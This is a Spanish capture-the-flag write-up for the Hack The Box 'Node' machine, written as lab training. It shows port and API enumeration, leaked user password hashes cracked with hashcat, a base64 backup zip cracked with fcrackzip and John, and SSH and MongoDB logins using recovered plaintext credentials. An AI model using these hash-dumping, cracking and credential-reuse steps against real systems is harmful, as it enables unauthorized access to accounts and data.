# Node-HTB

Esta es la resolucion de la maquina Node

## NMAP

Solo tiene dos puertos abiertos el 22 y el 3000

```
sudo nmap -sSVC -p22,3000 -vvv 10.129.75.0 -oN scan

PORT     STATE SERVICE
22/tcp   open  ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) (Ubuntu 16.04.7 LTS (Xenial Xerus)

3000/tcp open  ppp hadoop-datanode syn-ack ttl 63 Apache Hadoop


```

Ya sabes con eso basta para enumerar con que Ubuntu estamos trabajando.

## WHATWEB

Hay que intentar enumerar con lo que se pueda para saber a que nos estamos enfrentando.

```
whatweb http://10.129.74.234:3000/ 
```

![image](https://github.com/gecr07/Node-HTB/assets/63270579/fdf5f69e-a20d-40eb-802f-558fb3d4dc38)


## CURL

Para ver con que estamos tratando lanza un head.

![image](https://github.com/gecr07/Node-HTB/assets/63270579/170e9f88-2dde-4c27-9c5c-4ed64840bc93)


```
curl -I http://10.129.74.234:3000/

```

Toda esta informacion tambien podria verse desde el dev tools de firefox ya que en el oscp no se permite usar.

![image](https://github.com/gecr07/Node-HTB/assets/63270579/defa3833-8160-4aa6-96c0-f44090feedab)

En la peticion se comienza a notar que exiten diferentes rutas dentro de ese servidor.

![image](https://github.com/gecr07/Node-HTB/assets/63270579/956f38dc-45af-4e44-91f9-bf8ff48fa266)

Entonctramos usuarios que se podrian usar como potencial vector de ataque

```
id	"59a7368398aa325cc03ee51d"
username	"tom"
password	"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240"
is_admin	false
1	
_id	"59a7368e98aa325cc03ee51e"
username	"mark"
password	"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73"
is_admin	false
2	
_id	"59aa9781cced6f1d1490fce9"
username	"rastating"
password	"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0"
is_admin	false
```

La ruta que nos dice que hay una api es 

```
http://10.129.74.234:3000/api/users/latest
```

## FFUF

```
ffuf -r -fc 404 -fs 3861 -t 1000  -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.75.0:3000/api/FUZZ

```

Siempre es bueno revisar las rutas que tienen la api pasar por ahi con el navegador. Por suerte aqui me aparecio una ruta Users( si con mayusculas). Y al visitarla jalaba mas datos un usuario admin

```
http://10.129.74.234:3000/api/users/

[{"_id":"59a7365b98aa325cc03ee51c","username":"myP14ceAdm1nAcc0uNT","password":"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af","is_admin":true},{"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false},{"_id":"59a7368e98aa325cc03ee51e","username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false},{"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false}]

```

## HASHCAT

Tambien tenemos un login en la pagina se crackearon todos los hashes que se entontro:

```
hashid hash

hashcat -m 1400 hash_backup /usr/share/wordlists/rockyou.txt


tom:spongebob
mark:snowflake
rastating:no se pudo
myP14ceAdm1nAcc0uNT:manchester

```

Por la version de SSH se pudo enumerar pero como usa cosas con python 2 manda errores termine haciendolo con metasploit. Mejor intentalo con wfuzz o ffuf.

## fcrackzip vs JTR


![image](https://github.com/gecr07/Node-HTB/assets/63270579/0860137e-a837-4fb9-9ef6-821ca28a6b44)

Esto descarga un archivo que es un backup

```
file

cat file | base64 -d > file_decode
file # Nos dice que es un zip

7z l file
7z x file

## S4VITAR lo hizo asi para dejar todo en el mismo archivo

cat mybackup | base64 -d | sponge mybackup
```

Para crackear el passwd del .zip tenemos dos opciones JTR o fcrackzip.

```
 sudo fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file_backup 


PASSWORD FOUND!!!!: pw == magicword

## S4VITAR

zip2john file.zip > hash # te extrae un hash

john -w rockyou.txt hash
                         
```

Revisamos el app.js y ya de entrada vemos 2 cosas que son como keys mongo es una base de datos NOSQL.

![image](https://github.com/gecr07/Node-HTB/assets/63270579/e3335b8f-fd70-4e3f-80c2-2f5a617c2349)


Nos loggeamos con las credenciales de admin que entonctramos hasta aqui ya sabemos varias cosas esta usando NODEJS despues usa de servidor Express tiene una API ya tenemos usuarios validos y un servicio SSH en el puerto 22 toca probar todas las credenciales a ver si una es.

Ya te digo que ninguna credencial de las anteriores servis para inciar session con ssh. Pero si la que encontraste en el archivo.

```
sshpass -p 'passowrd' ssh tom@10.10.10.58 # esto sirve para poder automatizar algun script y probar passwords
```

## ss vs netstat

No en todos los sistemas tienen netstat pero tal parece que si ss

```
ss 
```


## MONGODB

Para poder conectase a esta base de datos se hace asi:

```
 const url= 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
  12   │ const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';

## Conectarse

mongo mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace

```






























